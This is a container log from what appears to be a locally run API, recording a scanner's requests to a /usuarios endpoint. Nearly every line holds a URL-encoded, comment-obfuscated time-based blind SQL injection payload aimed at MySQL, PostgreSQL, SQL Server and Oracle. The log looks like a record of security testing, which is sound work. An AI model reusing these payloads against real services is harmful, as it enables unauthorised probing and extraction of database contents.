api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8090%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29sgbf%29--%2F%2A%2A%2Fwdzn HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F7885%3D%28SELECT%2F%2A%2A%2F7885%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283218%3D3218 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F7885%3D%28SELECT%2F%2A%2A%2F7885%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7885%3D%28SELECT%2F%2A%2A%2F7885%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27LFLy%27%3D%27LFLy HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F7885%3D%28SELECT%2F%2A%2A%2F7885%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27InvZ%27%3D%27InvZ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F7885%3D%28SELECT%2F%2A%2A%2F7885%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FsuAr HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%287134%3D7134 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27BYRv%27%3D%27BYRv HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27DCHM%27%3D%27DCHM HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FKOEs HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28119%29%7C%7CCHR%28103%29%7C%7CCHR%28111%29%7C%7CCHR%2868%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282149%3D2149 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28119%29%7C%7CCHR%28103%29%7C%7CCHR%28111%29%7C%7CCHR%2868%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28119%29%7C%7CCHR%28103%29%7C%7CCHR%28111%29%7C%7CCHR%2868%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27cKdi%27%3D%27cKdi HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28119%29%7C%7CCHR%28103%29%7C%7CCHR%28111%29%7C%7CCHR%2868%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vKvy%27%3D%27vKvy HTTP/1.1
